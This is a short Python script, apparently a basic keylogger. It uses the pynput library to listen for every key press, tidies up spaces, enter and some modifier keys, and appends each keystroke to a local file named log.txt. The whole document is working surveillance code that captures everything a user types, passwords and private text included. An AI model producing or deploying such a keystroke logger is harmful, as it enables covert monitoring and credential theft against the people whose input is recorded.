from pynput.keyboard import Listener


def write_to_file(key):

    key_stroke = str(key)
    key_stroke = key_stroke.replace("'", "")

    if key_stroke == 'Key.space':
        key_stroke = ' '
    if key_stroke == 'Key.shift_r':
        key_stroke = ''
    if key_stroke == "Key.ctrl_l":
        key_stroke = ""
    if key_stroke== "Key.enter":
        key_stroke = "\n"

    with open("log.txt", 'a') as f:
        f.write(key_stroke)


with Listener(on_press=write_to_file) as letter:
    letter.join()
